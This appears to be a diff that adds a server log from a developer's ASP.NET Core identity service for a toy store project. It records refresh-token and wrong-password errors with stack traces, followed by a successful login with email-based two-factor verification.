+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:22:36.722 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 20:22:36.737 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 147.6199 ms
+2025-05-10 20:22:36.737 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 20:22:36.741 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 131.1898 ms
+2025-05-10 20:27:49.952 +05:00 [INF] HTTP OPTIONS /auth/reset-password responded 204 in 1.0501 ms
+2025-05-10 20:27:50.286 +05:00 [INF] HTTP POST /auth/reset-password responded 200 in 328.9121 ms
+2025-05-10 20:28:01.323 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.1807 ms
+2025-05-10 20:28:01.605 +05:00 [WRN] Неверный пароль у пользователя sergei05037@gmail.com
+2025-05-10 20:28:01.701 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Неверный пароль.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 117
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:28:01.715 +05:00 [WRN] Ошибка 403: Неверный пароль. | Path: /auth/login
+2025-05-10 20:28:01.716 +05:00 [INF] HTTP POST /auth/login responded 403 in 386.2812 ms
+2025-05-10 20:28:09.578 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.1097 ms
+2025-05-10 20:28:09.863 +05:00 [INF] Пользователь sergei05037@gmail.com успешно вошёл в систему.
+2025-05-10 20:28:09.867 +05:00 [INF] Отправка 2FA кода на email для пользователя sergei05037@gmail.com
+2025-05-10 20:28:10.800 +05:00 [INF] HTTP POST /auth/login responded 200 in 1217.4638 ms
+2025-05-10 20:28:32.637 +05:00 [INF] HTTP OPTIONS /auth/verify-2fa responded 204 in 0.8991 ms
+2025-05-10 20:28:32.934 +05:00 [INF] HTTP POST /auth/verify-2fa responded 200 in 21.3658 ms
